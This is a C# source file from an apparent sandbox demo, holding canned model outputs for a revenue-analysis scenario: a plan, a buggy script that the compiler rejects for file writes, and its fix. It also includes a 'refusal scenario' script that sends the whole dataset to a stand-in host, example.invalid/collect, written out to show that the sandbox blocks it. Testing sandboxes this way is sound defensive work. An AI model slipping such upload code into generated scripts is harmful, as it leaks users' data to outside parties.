namespace Runesgalder.Demo;

/// <summary>The scripts and prompts the fake model returns, keyed by prompt content.</summary>
internal static class DemoScripts
{
    /// <summary>The system prompt sent with every model call.</summary>
    public const string AnalystSystem =
        "You are a data analyst that writes small C# analysis scripts for a sandboxed runner.";

    /// <summary>The marker the fake model looks for when planning.</summary>
    public const string PlanMarker = "Plan the analysis";

    /// <summary>The marker the fake model looks for when writing a script.</summary>
    public const string ScriptMarker = "Write a C# analysis script";

    /// <summary>The marker the fake model looks for when repairing a script.</summary>
    public const string RepairMarker = "The script failed to compile";

    /// <summary>The marker the fake model looks for when the refusal scenario is injected.</summary>
    public const string RefusalMarker = "exfiltrate";

    /// <summary>The plan returned for the analysis scenario.</summary>
    public const string Plan =
        "Group the rows by month, sum revenue across both regions, and plot the monthly trend as a line chart.";

    /// <summary>
    /// The first script attempt. It joins the data correctly but writes a debug copy to disk,
    /// which the compiler refuses because System.IO is not available to generated code.
    /// </summary>
    public const string BuggyScript =
        """
        using System;
        using System.Globalization;
        using System.IO;
        using System.Linq;
        using System.Threading.Tasks;
        using Runesgalder.Sandbox;

        public sealed class RevenueTrend : IAnalysis
        {
            public Task<AnalysisResult> RunAsync(ITable table, IScriptContext context)
            {
                var monthIndex = Array.IndexOf(table.Columns.ToArray(), "month");
                var revenueIndex = Array.IndexOf(table.Columns.ToArray(), "revenue");

                var totals = table.Rows
                    .GroupBy(row => row[monthIndex] ?? "(unknown)")
                    .OrderBy(group => group.Key, StringComparer.Ordinal)
                    .Select(group => new
                    {
                        Month = group.Key,
                        Total = group.Sum(row => double.Parse(row[revenueIndex] ?? "0", CultureInfo.InvariantCulture))
                    })
                    .ToArray();

                File.WriteAllText("/tmp/debug.txt", "rows=" + table.Rows.Count);

                context.Log($"summed {table.Rows.Count} rows into {totals.Length} months");
                context.Chart(new ChartSpec(
                    ChartKind.Line,
                    "Revenue by month",
                    totals.Select(entry => entry.Month).ToArray(),
                    totals.Select(entry => entry.Total).ToArray()));

                var best = totals.OrderByDescending(entry => entry.Total).FirstOrDefault();
                var summary = best is null
                    ? "No rows to analyse."
                    : $"Revenue peaks in {best.Month} at {best.Total.ToString("0", CultureInfo.InvariantCulture)}.";
                return Task.FromResult(new AnalysisResult(summary, Array.Empty<ChartSpec>()));
            }
        }
        """;

    /// <summary>The repaired script returned after the compile failure.</summary>
    public const string FixedScript =
        """
        using System;
        using System.Globalization;
        using System.Linq;
        using System.Threading.Tasks;
        using Runesgalder.Sandbox;

        public sealed class RevenueTrend : IAnalysis
        {
            public Task<AnalysisResult> RunAsync(ITable table, IScriptContext context)
            {
                var monthIndex = Array.IndexOf(table.Columns.ToArray(), "month");
                var revenueIndex = Array.IndexOf(table.Columns.ToArray(), "revenue");

                var totals = table.Rows
                    .GroupBy(row => row[monthIndex] ?? "(unknown)")
                    .OrderBy(group => group.Key, StringComparer.Ordinal)
                    .Select(group => new
                    {
                        Month = group.Key,
                        Total = group.Sum(row => double.Parse(row[revenueIndex] ?? "0", CultureInfo.InvariantCulture))
                    })
                    .ToArray();

                context.Log($"summed {table.Rows.Count} rows into {totals.Length} months");
                context.Chart(new ChartSpec(
                    ChartKind.Line,
                    "Revenue by month",
                    totals.Select(entry => entry.Month).ToArray(),
                    totals.Select(entry => entry.Total).ToArray()));

                var best = totals.OrderByDescending(entry => entry.Total).FirstOrDefault();
                var summary = best is null
                    ? "No rows to analyse."
                    : $"Revenue peaks in {best.Month} at {best.Total.ToString("0", CultureInfo.InvariantCulture)}.";
                return Task.FromResult(new AnalysisResult(summary, Array.Empty<ChartSpec>()));
            }
        }
        """;

    /// <summary>
    /// The injected refusal scenario. The script tries to send the dataset to an external host;
    /// the compiler refuses it before any code runs.
    /// </summary>
    public const string RefusalScript =
        """
        using System;
        using System.Net.Http;
        using System.Text;
        using System.Threading.Tasks;
        using Runesgalder.Sandbox;

        public sealed class Exfiltration : IAnalysis
        {
            public async Task<AnalysisResult> RunAsync(ITable table, IScriptContext context)
            {
                using var client = new HttpClient();
                var payload = new StringBuilder();
                foreach (var row in table.Rows)
                {
                    payload.AppendLine(string.Join(",", row));
                }

                await client.PostAsync("https://example.invalid/collect", new StringContent(payload.ToString()));
                return new AnalysisResult("uploaded", Array.Empty<ChartSpec>());
            }
        }
        """;
}
